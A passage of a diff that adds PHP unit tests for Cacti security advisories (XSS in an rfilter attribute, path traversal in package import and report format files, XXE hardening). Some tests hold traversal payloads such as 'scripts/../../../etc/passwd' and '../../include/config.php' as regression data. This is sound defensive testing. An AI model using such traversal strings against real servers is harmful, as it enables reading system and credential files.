++	$contents = file_get_contents($aggregateGraphsPath);
++
++	// htmlerv() must be used instead of raw grv() in the value attribute.
++	expect($contents)->toContain("htmlerv('rfilter')");
++	expect($contents)->not->toContain("value='<?php print grv('rfilter'); ?>'");
++});
++
++test('GHSA-fwh3: contract — rfilter output in HTML attributes must use htmlerv()', function () use ($aggregateGraphsPath) {
++	$contents = file_get_contents($aggregateGraphsPath);
++
++	// htmlerv() is the Cacti convention for encoding HTML attribute values
++	// retrieved from request variables. The raw grv() call must be replaced.
++	$hasRaw    = str_contains($contents, "value='<?php print grv('rfilter'); ?>'");
++	$hasSafe   = str_contains($contents, "value='<?php print htmlerv('rfilter'); ?>'");
++
++	// Fails until the advisory is remediated.
++	expect($hasRaw)->toBeFalse('raw grv() must be replaced with htmlerv()');
++	expect($hasSafe)->toBeTrue('htmlerv() must be used for the rfilter value attribute');
++});
++
++// ---------------------------------------------------------------------------
++// GHSA-vp35: Path traversal in package import file write (lib/import.php)
++// ---------------------------------------------------------------------------
++
++test('GHSA-vp35: str_contains scripts/ prefix check is bypassable with directory traversal', function () {
++	// The guard in import.php line 655 accepts any $name that contains the
++	// substring 'scripts/'. A crafted name satisfies the check while the
++	// resolved path escapes the base directory.
++	$name = 'scripts/../../../etc/passwd';
++
++	expect(str_contains($name, 'scripts/'))->toBeTrue();
++});
++
++test('GHSA-vp35: traversal payload resolves outside CACTI_PATH_BASE', function () {
++	$base     = '/var/www/cacti';
++	$name     = 'scripts/../../../etc/passwd';
++	$filename = $base . '/' . $name;
++
++	// realpath() would expose the escape; the current code skips this check.
++	$resolved = realpath($filename);
++
++	// On a real filesystem the path resolves to /etc/passwd (outside $base).
++	// In unit context realpath() returns false for non-existent paths, but
++	// the arithmetic remains: stripping the traversal segments leaves a path
++	// that does not begin with $base.
++	$normalized = implode('/', array_reduce(
++		explode('/', $filename),
++		function (array $parts, string $seg): array {
++			if ($seg === '..') {
++				array_pop($parts);
++			} elseif ($seg !== '.' && $seg !== '') {
++				$parts[] = $seg;
++			}
++
++			return $parts;
++		},
++		[]
++	));
++
++	expect(str_starts_with('/' . $normalized, $base . '/'))->toBeFalse();
++});
++
++test('GHSA-vp35: contract — import file paths are validated with validate_relative_path_within', function () use ($importPath) {
++	$contents = file_get_contents($importPath);
++
++	// The fix must validate the path before writing.
++	expect($contents)->toContain('validate_relative_path_within');
++});
++
++// ---------------------------------------------------------------------------
++// GHSA-pr9x: Path traversal in package_import.php read
++// ---------------------------------------------------------------------------
++
++test('GHSA-pr9x: package_import.php validates filename with validate_relative_path_within', function () use ($packageImportPath) {
++	$contents = file_get_contents($packageImportPath);
++
++	// The fix validates the filename before reading.
++	expect($contents)->toContain('validate_relative_path_within($filename, CACTI_PATH_BASE)');
++	// The old unvalidated file_get_contents must use the validated path.
++	expect($contents)->toContain('file_get_contents($validated_path)');
++});
++
++// ---------------------------------------------------------------------------
++// GHSA-mjvw: Path traversal via format_file in reports
++// ---------------------------------------------------------------------------
++
++test('GHSA-mjvw: html_reports.php saves format_file with basename() validation', function () use ($htmlReportsPath) {
++	$contents = file_get_contents($htmlReportsPath);
++
++	// The fix applies basename() to strip directory traversal.
++	expect($contents)->toContain("basename(\$post['format_file'])");
++	// The old unvalidated assignment must not exist.
++	expect($contents)->not->toContain("\$save['format_file']   = \$post['format_file']");
++});
++
++test('GHSA-mjvw: a traversal format_file resolves outside CACTI_PATH_FORMATS', function () {
++	// reports_load_format_file() prepends CACTI_PATH_FORMATS without
++	// sanitizing the stored value, so a stored traversal sequence escapes
++	// the formats directory at read time.
++	$formatsDir  = '/var/www/cacti/formats';
++	$formatFile  = '../../include/config.php';
++	$resolved    = $formatsDir . '/' . $formatFile;
++
++	$normalized = implode('/', array_reduce(
++		explode('/', $resolved),
++		function (array $parts, string $seg): array {
++			if ($seg === '..') {
++				array_pop($parts);
++			} elseif ($seg !== '.' && $seg !== '') {
++				$parts[] = $seg;
++			}
++
++			return $parts;
++		},
++		[]
++	));
++
++	expect(str_starts_with('/' . $normalized, $formatsDir . '/'))->toBeFalse();
++});
+diff --git a/tests/Unit/XmlXxeHardeningTest.php b/tests/Unit/XmlXxeHardeningTest.php
+new file mode 100644
+index 0000000000..fc1d8a95eb
+--- /dev/null
++++ b/tests/Unit/XmlXxeHardeningTest.php
+@@ -0,0 +1,36 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ |                                                                         |
++ | This program is distributed in the hope that it will be useful,         |
++ | but WITHOUT ANY WARRANTY; without even the implied warranty of          |
++ | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |
++ | GNU General Public License for more details.                            |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++require_once dirname(__DIR__) . '/Helpers/CactiStubs.php';
++require_once dirname(__DIR__, 2) . '/lib/xml.php';
++
++test('xml2array uses libxml_disable_entity_loader', function () {
++	$xmlPath = __DIR__ . '/../../lib/xml.php';
++	$contents = file_get_contents($xmlPath);
++
++	expect($contents)->toContain('libxml_disable_entity_loader(true)');
++});
++
++test('xml2array handles basic XML correctly', function () {
++	$xml = '<cacti><hash_00>value</hash_00></cacti>';
++	$result = xml2array($xml);
++
++	expect($result)->toBeArray();
++	expect($result['hash_00'])->toBe('value');
++});
